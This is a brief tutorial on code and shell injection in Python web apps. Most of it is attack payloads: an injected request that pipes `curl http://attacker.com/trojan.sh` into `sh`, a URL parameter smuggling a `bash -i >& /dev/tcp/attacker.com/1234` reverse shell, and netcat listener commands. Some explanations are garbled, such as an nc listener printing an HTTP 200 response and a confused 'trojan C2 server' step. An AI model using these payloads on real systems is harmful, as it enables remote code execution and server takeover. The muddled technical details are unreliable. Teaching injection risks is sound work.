# Code Injection

Code injection is the malicious injection or introduction of code into an application. This code is then used by an attacker to change the flow of execution of the application, allowing the attacker to execute arbitrary code. Let's take a look at a simple example of code injection with Python in a web application.

```python
import os
os.system("ls")
```

Imagine that the above code is part of a web application where no validation is done on the input. An attacker can inject these commands into the application and execute arbitrary code on the server. The web application request might look like this:

```python
GET /?name="__import__('os').system('ls')"
Host: example.com
```

If this works, the attacker can execute any command on the server. Instead, a trojan C2 server can be injected into the application.

```python
GET /?name="__import__('os').system('curl http://attacker.com/trojan.sh | sh')"
Host: example.com
```

The attacker can then start receiving data from the server with `nc` (reverse shell).

```bash
nc -l -p 1234

HTTP/1.1 200 OK
```

And the server is compromised.

## Shell Injection

A shell injection is a type of code injection where the attacker injects a shell command into the application. This command is then executed by the application, allowing the attacker to execute arbitrary code. Let's take a look at a simple example of shell injection with Python in a web application.

```python
GET /download?url="google.com;bash -i >& /dev/tcp/attacker.com/1234 0>&1"
Host: example.com
```

The attacker can receive the reverse shell with `nc`.

```bash
nc -l -p 1234

HTTP/1.1 200 OK
```
